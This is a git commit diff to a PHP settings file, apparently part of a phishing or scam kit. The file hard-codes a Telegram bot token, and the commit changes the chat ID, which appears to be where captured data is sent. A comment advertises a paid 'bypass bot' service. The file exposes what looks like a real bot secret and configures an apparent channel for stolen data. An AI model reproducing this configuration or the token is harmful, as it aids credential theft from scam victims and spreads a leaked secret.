a9ae71c148d9a2e233cc19b595f462b8d740d6b8
INDOX0D3 <107053080+INDOX0D3@users.noreply.github.com>
2022-07-10 14:58:51 +0700

    Update setting.php

--- bkp/api/setting.php
+++ bkp/api/setting.php
@@ -3,6 +3,6 @@
 // License Auth By SCHT
 // Jasa Bypass Bot PM sini BAWA UANG JANGAN LUPA WKKWKW
 $botToken="5568180204:AAEMAXx_bVfVMN2vY285OJeWRFBY9dF83Dk"; // token bot telegram
-$chatId="5231578702";  // chatId telegram
+$chatId="5401415863";  // chatId telegram
 
 ?>
